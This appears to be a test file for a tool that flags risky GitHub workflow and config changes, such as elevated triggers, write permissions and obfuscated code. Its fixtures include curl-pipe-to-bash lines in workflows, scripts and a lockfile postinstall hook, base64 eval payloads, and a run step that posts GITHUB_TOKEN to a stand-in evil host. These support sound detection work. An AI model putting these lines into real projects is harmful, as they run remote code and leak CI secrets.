const assert = require("assert");
const {
  detectStructuralFindings,
  workflowExecutableUses,
  findUnpinnedActions,
  introducesOidcWritePermission,
  introducesWritePermissions,
  patchIntroducesOidcWritePermission,
} = require("../src/structural");

const findings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/ci.yml",
      patch: [
        "@@",
        "+on:",
        "+  pull_request_target:",
        "+permissions: write-all",
        "+id-token: write",
      ].join("\n"),
    },
    {
      filename: "src/app.js",
      patch: "+console.log('safe')",
    },
  ],
});

assert(findings.find((finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED"));
assert(findings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(findings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const noFindings = detectStructuralFindings({
  files: [{ filename: "src/app.js", patch: "+console.log('safe')" }],
});

assert.equal(noFindings.length, 0);

const inlineFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline.yml",
      patch: [
        "@@",
        "+on: [pull_request, pull_request_target]",
        "+permissions: { contents: write, id-token: write, pull-requests: write }",
      ].join("\n"),
    },
  ],
});

assert(inlineFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(inlineFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const inlineNonWriteFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline-read.yml",
      patch: "+permissions: { contents: read, id-token: write-token }",
    },
  ],
});
assert(
  !inlineNonWriteFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const inlineObjectFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline-object.yml",
      patch: "+on: { pull_request_target: {} }",
    },
  ],
});

assert(inlineObjectFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const scalarTriggerFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/scalar.yml",
      patch: "+on: pull_request_target # elevated trigger",
    },
  ],
});
assert(scalarTriggerFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const quotedTriggerFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/quoted.yml",
      patch: [
        '+"on": "pull_request_target"',
        "+'pull_request_target':",
      ].join("\n"),
    },
  ],
});
assert(quotedTriggerFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const nonCorePermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/packages.yml",
      patch: [
        "@@",
        "+permissions:",
        "+  packages: write",
        "+  deployments: write",
      ].join("\n"),
    },
  ],
});
assert(
  nonCorePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const actionInputWriteFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/input-mode.yml",
      patch: [
        "@@",
        "+jobs:",
        "+  build:",
        "+    steps:",
        "+      - uses: example/action@v1",
        "+        with:",
        "+          mode: write",
      ].join("\n"),
    },
  ],
});
assert(
  !actionInputWriteFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const actionInputPermissionNameFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/input-contents.yml",
      patch: [
        "@@",
        "+jobs:",
        "+  build:",
        "+    steps:",
        "+      - uses: example/action@v1",
        "+        with:",
        "+          contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  !actionInputPermissionNameFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const envPermissionNameFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/env-contents.yml",
      patch: [
        "@@",
        "+env:",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  !envPermissionNameFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const contextPermissionBlockFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/existing-permissions.yml",
      patch: [
        "@@",
        " permissions:",
        "-  contents: read",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  contextPermissionBlockFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const missingHeaderPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/existing-large-permissions.yml",
      patch: [
        "@@",
        "   statuses: read",
        "+  id-token: write",
      ].join("\n"),
    },
  ],
});
assert(
  missingHeaderPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !missingHeaderPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const quotedPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/quoted-permissions.yml",
      patch: [
        "@@",
        "+\"permissions\": \"write-all\"",
        "+permissions:",
        "+  \"contents\": \"write\"",
        "+'permissions': { 'pull-requests': 'write' }",
      ].join("\n"),
    },
  ],
});
assert(
  quotedPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const oidcOnlyPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: [
        "@@",
        "+permissions:",
        "+  id-token: write",
        "+  contents: read",
        "+  pull-requests: read",
      ].join("\n"),
    },
  ],
});
assert(
  oidcOnlyPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !oidcOnlyPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const oidcInlinePermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/oidc-inline.yml",
      patch: "+permissions: { contents: read, id-token: write }",
    },
  ],
});
assert(
  oidcInlinePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !oidcInlinePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const workflowTemplateFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflow-templates/release.yml",
      patch: [
        "@@",
        "+on: pull_request_target",
        "+permissions:",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED",
  ),
);
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const renamedProtectedFindings = detectStructuralFindings({
  files: [
    {
      filename: "src/moved-ci.yml",
      previous_filename: ".github/workflows/ci.yml",
      patch: "+name: moved",
    },
  ],
});
const renamedProtectedFinding = renamedProtectedFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(renamedProtectedFinding);
assert(renamedProtectedFinding.paths.includes(".github/workflows/ci.yml"));

const missingPatchFindings = detectStructuralFindings({
  files: [{ filename: ".github/workflows/large.yml" }],
});
assert(missingPatchFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_DIFF_UNAVAILABLE"));

const contentFallbackFindings = detectStructuralFindings({
  files: [{ filename: ".github/workflows/full.yml" }],
  fileContents: {
    ".github/workflows/full.yml": [
      "on:",
      "  pull_request_target:",
      "permissions: write-all",
    ].join("\n"),
  },
});
assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const protectedObfuscationFindings = detectStructuralFindings({
  files: [
    {
      filename: "next.config.js",
      patch: [
        "@@",
        "+global.o = '5-3-" + "132-du';",
        "+module.exports = {};",
      ].join("\n"),
    },
  ],
});
const protectedObfuscationFinding = protectedObfuscationFindings.find(
  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
);
assert(protectedObfuscationFinding);
assert.equal(protectedObfuscationFinding.severity, "high");
assert(protectedObfuscationFinding.paths.includes("next.config.js"));

const protectedEvalFindings = detectStructuralFindings({
  files: [
    {
      filename: "web/tailwind.config.js",
      patch:
        "+module.exports = ev" +
        "al(Buffer.from('ZXhwb3J0IGRlZmF1bHQge30=', 'base64').toString())",
    },
  ],
});
assert(
  protectedEvalFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const protectedRemoteShellFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/build.yml",
      patch:
        "+run: curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash",
    },
  ],
});
assert(
  protectedRemoteShellFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const protectedRemoteShellInScriptFindings = detectStructuralFindings({
  files: [
    {
      filename: "scripts/install.js",
      patch:
        "+execSync('curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash')",
    },
  ],
});
assert(
  protectedRemoteShellInScriptFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const customProtectedSourceObfuscationFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "src/index.js",
      patch:
        "+module.exports = Fun" +
        "ction(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())",
    },
  ],
});
assert(
  customProtectedSourceObfuscationFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const missingCustomProtectedSourcePatchFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [{ filename: "src/index.js" }],
});
assert(
  missingCustomProtectedSourcePatchFindings.find(
    (finding) =>
      finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const deletionOnlyCustomProtectedPatchFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "src/legacy.js",
      status: "removed",
      patch: [
        "@@ -1,2 +0,0 @@",
        "-const legacy = true;",
        "-module.exports = legacy;",
      ].join("\n"),
    },
  ],
});
assert(
  deletionOnlyCustomProtectedPatchFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !deletionOnlyCustomProtectedPatchFindings.find(
    (finding) =>
      finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const benignProtectedConfigFindings = detectStructuralFindings({
  files: [
    {
      filename: "web/next.config.js",
      patch: "+module.exports = { poweredByHeader: false };",
    },
  ],
});
assert(
  benignProtectedConfigFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !benignProtectedConfigFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);
const benignProtectedConfigFinding = benignProtectedConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert.equal(benignProtectedConfigFinding.severity, "warning");

const guardWorkflowFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: "+          block-protected-paths: false",
    },
  ],
});
const guardWorkflowFinding = guardWorkflowFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(guardWorkflowFinding);
assert.equal(guardWorkflowFinding.severity, "high");

const repositoryPolicyConfigFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  files: [
    {
      filename: ".aport/policy.yaml",
      patch: "+github:\n+  block_protected_paths: false",
    },
  ],
});
const repositoryPolicyConfigFinding = repositoryPolicyConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(repositoryPolicyConfigFinding);
assert.equal(repositoryPolicyConfigFinding.severity, "high");

const omittedWorkflowProtectedPathsFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  protectedPaths: ["src/**"],
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: "+          uses: attacker/action@v1",
    },
  ],
});
const omittedWorkflowProtectedPathsFinding =
  omittedWorkflowProtectedPathsFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  );
assert(omittedWorkflowProtectedPathsFinding);
assert.equal(omittedWorkflowProtectedPathsFinding.severity, "high");

const consumerAppPathFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "functions/api/github/webhook.js",
      patch: "+export function handler() { return Response.json({ ok: true }); }",
    },
  ],
});
assert(
  !consumerAppPathFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);

const blockingProtectedConfigFindings = detectStructuralFindings({
  blockProtectedPaths: true,
  files: [
    {
      filename: "web/next.config.js",
      patch: "+module.exports = { poweredByHeader: false };",
    },
  ],
});
const blockingProtectedConfigFinding = blockingProtectedConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(blockingProtectedConfigFinding);
assert.equal(blockingProtectedConfigFinding.severity, "high");

const protectedDocsFindings = detectStructuralFindings({
  files: [
    {
      filename: "policies/system.command.execute.v1/README.md",
      patch:
        "+Example only: exec('curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash')",
    },
  ],
});
assert(
  protectedDocsFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !protectedDocsFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const missingSensitivePatchFindings = detectStructuralFindings({
  files: [{ filename: "web/next.config.js" }],
});
const missingSensitivePatchFinding = missingSensitivePatchFindings.find(
  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
);
assert(missingSensitivePatchFinding);
assert.equal(missingSensitivePatchFinding.severity, "high");
assert(missingSensitivePatchFinding.paths.includes("web/next.config.js"));

const missingLockfilePatchFindings = detectStructuralFindings({
  files: [{ filename: "web/pnpm-lock.yaml" }],
});
assert(
  missingLockfilePatchFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !missingLockfilePatchFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const lockfilePayloadFindings = detectStructuralFindings({
  files: [
    {
      filename: "package-lock.json",
      patch:
        "+\"postinstall\": \"curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash\"",
    },
  ],
});
assert(
  lockfilePayloadFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const policyFindings = detectStructuralFindings({
  files: [{ filename: ".aport/policy.yaml", patch: "+version: oap-github-policy/1" }],
});
assert(policyFindings.find((finding) => finding.code === "OAP.GH.POLICY_HEAD_UNTRUSTED"));

const pinnedFindings = detectStructuralFindings({
  requirePinnedActions: true,
  files: [
    {
      filename: ".github/workflows/pin.yml",
      patch: [
        "@@",
        "+steps:",
        "+  - uses: actions/checkout@v4",
        "+  - uses: aporthq/policy-verify-action@0123456789abcdef0123456789abcdef01234567",
      ].join("\n"),
    },
  ],
});
const unpinnedFinding = pinnedFindings.find((finding) => finding.code === "OAP.REPO.UNPINNED_ACTION");
assert(unpinnedFinding);
assert.deepEqual(unpinnedFinding.actions, ["actions/checkout@v4"]);

const commentedUsesFindings = detectStructuralFindings({
  requirePinnedActions: true,
  files: [
    {
      filename: ".github/workflows/commented-uses.yml",
      patch: "+  - uses: actions/setup-node@v4 # install node",
    },
  ],
});
const commentedUsesFinding = commentedUsesFindings.find(
  (finding) => finding.code === "OAP.REPO.UNPINNED_ACTION",
);
assert(commentedUsesFinding);
assert.deepEqual(commentedUsesFinding.actions, ["actions/setup-node@v4"]);

const truncatedFindings = detectStructuralFindings({
  evidenceTruncated: { files: true, commits: false, maxPages: 20 },
});
const truncatedFinding = truncatedFindings.find(
  (finding) => finding.code === "OAP.REPO.EVIDENCE_TRUNCATED",
);
assert(truncatedFinding);
assert.equal(truncatedFinding.severity, "high");

assert.deepEqual(findUnpinnedActions("+uses: ./local/action\n+uses: docker://alpine:3"), []);
assert.equal(introducesWritePermissions("permissions:\n  id-token: write"), false);
assert.equal(introducesOidcWritePermission("permissions:\n  id-token: write"), true);
assert.equal(
  patchIntroducesOidcWritePermission("@@\n permissions:\n+  id-token: write"),
  true,
);
assert.equal(introducesWritePermissions("permissions:\n  contents: write"), true);

// --- bootstrap install -------------------------------------------------
// The first-install PR adds the guard workflow. Control-plane paths are
// fail-closed, so without the bootstrap case every new adopter's first PR goes
// red on the file it is installing, which teaches people to remove the check.
// Reported, not blocked, and only when nothing is being weakened.
const GUARD_WF = ".github/workflows/aport-guard.yml";
// A real install carries a `uses:` STEP naming this action. A raw line match is
// not enough: `run: |` block scalars can contain the same text.
const GUARD_USES = "+      - uses: aporthq/policy-verify-action@v1";
const guardInstallPatch = (...extra) =>
  ["@@", "+name: APort Repository Guard", "+on: [pull_request]", "+jobs:",
   "+  aport:", "+    steps:", GUARD_USES, ...extra].join("\n");
// The carve-out only applies to pull-request validation, so every install
// fixture has to say which event it is. Push stays fail-closed.
const onPullRequest = (options) =>
  detectStructuralFindings({ eventName: "pull_request", ...options });
const blockingCodes = (findings) =>
  findings
    .filter((f) => ["high", "error"].includes(String(f.severity).toLowerCase()))
    .map((f) => f.code);

const bootstrapFindings = onPullRequest({
  files: [
    {
      filename: GUARD_WF,
      status: "added",
      patch: guardInstallPatch("+permissions:", "+  contents: read"),
    },
  ],
});
const bootstrapFinding = bootstrapFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(bootstrapFinding);
assert.equal(bootstrapFinding.severity, "warning");
assert.equal(bootstrapFinding.details.bootstrap_install, true);
assert.deepEqual(blockingCodes(bootstrapFindings), []);

// Installing the guard alongside ordinary source changes is still an install.
assert.deepEqual(
  blockingCodes(
    onPullRequest({
      files: [
        { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
        { filename: "src/app.ts", status: "modified", patch: "@@\n+const x = 1;\n" },
      ],
    }),
  ),
  [],
);

// block-protected-paths: true is an explicit opt-in to fail closed, so it wins.
assert.equal(
  onPullRequest({
    files: [{ filename: GUARD_WF, status: "added", patch: guardInstallPatch() }],
    blockProtectedPaths: true,
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "high",
);

// Everything that can actually weaken the guard must still block.
for (const [label, files] of [
  ["modifying an existing workflow", [
    { filename: GUARD_WF, status: "modified", patch: "@@\n-  contents: read\n+permissions: write-all\n" }]],
  ["deleting the guard workflow", [
    { filename: GUARD_WF, status: "removed", patch: "" }]],
  ["adding a workflow with write-all", [
    { filename: ".github/workflows/evil.yml", status: "added", patch: "@@\n+permissions: write-all\n" }]],
  ["adding pull_request_target", [
    { filename: ".github/workflows/evil.yml", status: "added",
      patch: "@@\n+on: [pull_request_target]\n+permissions:\n+  contents: write\n" }]],
  ["installing while modifying another workflow", [
    { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
    { filename: ".github/workflows/ci.yml", status: "modified", patch: "@@\n+  foo: bar\n" }]],
  ["weakening an existing policy file", [
    { filename: ".aport/policy.yaml", status: "modified", patch: "@@\n-strict: true\n+strict: false\n" }]],
]) {
  assert(
    blockingCodes(onPullRequest({ files })).length > 0,
    `${label} must still fail closed`,
  );
}

// Only an actual guard install gets the carve-out. Adding an unrelated
// workflow, a local composite action or a brand-new policy file is still a
// control-plane change and stays fail-closed, even though every file is new.
for (const [label, files] of [
  ["an unrelated workflow", [
    { filename: ".github/workflows/deploy.yml", status: "added",
      patch: "@@\n+name: Deploy\n+on: [push]\n+jobs:\n+  deploy:\n+    steps:\n+      - run: ./deploy.sh\n" }]],
  ["an unrelated composite action", [
    { filename: ".github/actions/deploy/action.yml", status: "added",
      patch: "@@\n+name: Deploy\n+runs:\n+  using: composite\n" }]],
  ["a brand-new policy file", [
    { filename: ".aport/policy.yaml", status: "added",
      patch: "@@\n+version: oap-github-policy/1\n" }]],
  ["a workflow naming a lookalike action", [
    { filename: ".github/workflows/evil.yml", status: "added",
      patch: "@@\n+jobs:\n+  x:\n+    steps:\n+      - uses: evil/policy-verify-action@v1\n" }]],
]) {
  const finding = onPullRequest({ files }).find(
    (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  );
  assert.equal(finding.severity, "high", `adding ${label} must not read as an install`);
  assert.equal(finding.details, undefined, `adding ${label} must not be marked bootstrap`);
}

// A repository that requires pinning has asked for pinning to be enforced.
// OAP.REPO.UNPINNED_ACTION is only warning-level, so downgrading the
// protected-path finding too would leave the install PR with nothing blocking
// and the required check would never fail. The unpinned install stays blocking.
const unpinnedInstall = onPullRequest({
  requirePinnedActions: true,
  files: [
    { filename: GUARD_WF, status: "added",
      patch: guardInstallPatch("+      - uses: actions/checkout@v4") },
  ],
});
const unpinnedInstallFinding = unpinnedInstall.find(
  (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert.equal(unpinnedInstallFinding.severity, "high");
assert.equal(unpinnedInstallFinding.details, undefined);
assert(blockingCodes(unpinnedInstall).includes("OAP.REPO.PROTECTED_PATH_TOUCHED"));
assert(unpinnedInstall.find((f) => f.code === "OAP.REPO.UNPINNED_ACTION"));

// Pinning every action in the same install restores the carve-out, so the fix
// is to pin rather than to drop the guard.
const pinnedInstall = onPullRequest({
  requirePinnedActions: true,
  files: [
    { filename: GUARD_WF, status: "added",
      patch: [
        "@@", "+jobs:", "+  aport:", "+    steps:",
        "+      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567",
        "+      - uses: aporthq/policy-verify-action@0123456789abcdef0123456789abcdef01234567",
      ].join("\n") },
  ],
});
assert.equal(
  pinnedInstall.find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);
assert.deepEqual(blockingCodes(pinnedInstall), []);

// When the repository does not require pinning, an unpinned install is still a
// bootstrap: nothing has asked for pins, so there is no check to keep blocking.
assert.equal(
  onPullRequest({
    files: [
      { filename: GUARD_WF, status: "added",
        patch: guardInstallPatch("+      - uses: actions/checkout@v4") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);

// The marker may arrive as full file content when GitHub omits the patch.
assert.equal(
  onPullRequest({
    files: [{ filename: GUARD_WF, status: "added" }],
    fileContents: {
      [GUARD_WF]: "jobs:\n  aport:\n    steps:\n      - uses: aporthq/policy-verify-action@v1\n",
    },
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);

// An install that also adds an unrelated control-plane file is not a plain
// install. Requiring only SOME control-plane file to be guard-related would
// hand the unrelated file the downgrade too.
for (const [label, extra] of [
  ["an unrelated new workflow", {
    filename: ".github/workflows/deploy.yml", status: "added",
    patch: "@@\n+name: Deploy\n+on: [push]\n+jobs:\n+  d:\n+    steps:\n+      - run: ./deploy.sh\n" }],
  ["an unrelated new composite action", {
    filename: ".github/actions/deploy/action.yml", status: "added",
    patch: "@@\n+name: Deploy\n+runs:\n+  using: composite\n" }],
]) {
  const findings = onPullRequest({
    files: [
      { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
      extra,
    ],
  });
  const finding = findings.find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED");
  assert.equal(finding.severity, "high", `installing alongside ${label} must fail closed`);
  assert.equal(finding.details, undefined, `${label} must not be marked bootstrap`);
}

// The guard marker has to be a real workflow step. `run: |` opens a block
// scalar whose body is literal text, so a heredoc quoting the `uses:` line is
// not an install and must not buy the carve-out.
for (const [label, body] of [
  ["a run heredoc", [
    "+      - run: |", "+          cat <<EOF",
    "+          uses: aporthq/policy-verify-action@v1", "+          EOF"]],
  ["a folded block scalar", [
    "+      - run: >", "+          echo uses: aporthq/policy-verify-action@v1"]],
  ["a non-step script key", [
    "+      - name: Setup", "+        script: |",
    "+          uses: aporthq/policy-verify-action@v1"]],
]) {
  const finding = onPullRequest({
    files: [
      { filename: ".github/workflows/evil.yml", status: "added",
        patch: ["@@", "+name: Evil", "+on: [push]", "+jobs:", "+  x:", "+    steps:",
                ...body].join("\n") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED");
  assert.equal(finding.severity, "high", `${label} must not read as an install`);
  assert.equal(finding.details, undefined, `${label} must not be marked bootstrap`);
}

// Reusable workflows and quoted `uses` keys are executable too. They must be
// parsed into the same allowlist instead of silently ignored while the guard
// step buys the install carve-out.
for (const [label, body] of [
  ["a job-level reusable workflow", [
    "+jobs:", "+  aport:", "+    steps:",
    "+      - uses: aporthq/policy-verify-action@v1",
    "+  reusable:", "+    uses: evil/reusable/.github/workflows/deploy.yml@v1"]],
  ["a quoted non-allowlisted step key", [
    "+jobs:", "+  aport:", "+    steps:",
    "+      - uses: aporthq/policy-verify-action@v1",
    "+      - \"uses\": evil/action@v1"]],
]) {
  const finding = onPullRequest({
    files: [
      { filename: ".github/workflows/aport-guard.yml", status: "added",
        patch: ["@@", "+name: Install", "+on: [pull_request]", ...body].join("\n") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED");
  assert.equal(finding.severity, "high", `${label} must not read as bootstrap`);
  assert.equal(finding.details, undefined, `${label} must not be marked bootstrap`);
}

// A named step that carries `uses:` as a later key of the same step mapping is
// a genuine install, matching how the shipped guard workflow is written.
assert.equal(
  onPullRequest({
    files: [
      { filename: GUARD_WF, status: "added",
        patch: ["@@", "+jobs:", "+  aport:", "+    steps:",
                "+      - name: APort Repository Guard",
                "+        uses: aporthq/policy-verify-action@v1"].join("\n") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);

// The carve-out is for the installing pull request. A direct push to a
// protected branch is the case the control-plane rule is fail-closed for, so
// the same files must stay high on push, and when no event is supplied at all.
const installFiles = [
  { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
];
for (const eventName of ["push", "", undefined, "schedule", "workflow_dispatch"]) {
  const finding = detectStructuralFindings({ files: installFiles, eventName }).find(
    (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  );
  assert.equal(finding.severity, "high", `event ${eventName} must not be downgraded`);
  assert.equal(finding.details, undefined, `event ${eventName} must not be marked bootstrap`);
}

// Merge-queue re-validation sees the same pull request content, so it keeps the
// downgrade. Otherwise an install that passed on the PR would fail on merge.
for (const eventName of ["pull_request", "pull_request_review", "merge_group"]) {
  assert.equal(
    detectStructuralFindings({ files: installFiles, eventName }).find(
      (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
    ).severity,
    "warning",
    `event ${eventName} must keep the install carve-out`,
  );
}

// --- the carve-out must not license a workflow that does more than install ---
// A guard step alone was not enough: a workflow carrying a real guard step AND
// an exfiltrating `run:` produced zero blocking findings, because the
// id-token/contents pair reads as OIDC and is only a warning. The install must
// therefore hold as a whole file.
const GUARD_WF_PATH = ".github/workflows/aport-guard.yml";
const installOf = (patch) =>
  blockingCodes(onPullRequest({
    files: [{ filename: GUARD_WF_PATH, status: "added", patch }],
  }));

assert.deepEqual(installOf(guardInstallPatch()), [], "a clean install still passes");
assert.deepEqual(
  installOf(guardInstallPatch("+      - uses: actions/checkout@v4")),
  [],
  "checkout alongside the guard is still an install",
);

for (const [label, extra] of [
  ["an exfiltrating run step", ['+      - run: curl https://evil.example -d "$GITHUB_TOKEN"']],
  ["an unrelated action step", ["+      - uses: some/other-action@v1"]],
  ["a second job running code", ["+  evil:", "+    if: false", "+    steps:", "+      - run: whoami"]],
  ["a run step inside a block scalar", ["+      - name: x", "+        run: |", "+          echo nested"]],
]) {
  assert(
    installOf(guardInstallPatch(...extra)).length > 0,
    `${label} must not qualify as an install`,
  );
}

// pull_request_target runs with the base repo's secrets against fork-authored
// head content, so it never gets the downgrade however the docs are read.
assert.equal(
  detectStructuralFindings({
    eventName: "pull_request_target",
    files: [{ filename: GUARD_WF_PATH, status: "added", patch: guardInstallPatch() }],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "high",
);

// The slug is compared whole. A substring match would accept both of these,
// which is exactly what the lookalike rule exists to stop.
for (const slug of ["evil-aporthq/policy-verify-action", "aporthq/policy-verify-action-evil"]) {
  assert(
    installOf(["@@", "+jobs:", "+  a:", "+    steps:", `+      - uses: ${slug}@v1`].join("\n")).length > 0,
    `${slug} must not qualify as the guard`,
  );
}

// A block scalar body indented only one level past its key: the position check
// alone does not reject this, so it exercises the block-scalar tracking itself.
assert(
  installOf(["@@", "+jobs:", "+  a:", "+    steps:", "+      - run: |",
             "+        uses: aporthq/policy-verify-action@v1"].join("\n")).length > 0,
  "a uses: inside a shallowly-indented block scalar is not a step",
);

// --- a uses: only counts where it actually runs -------------------------
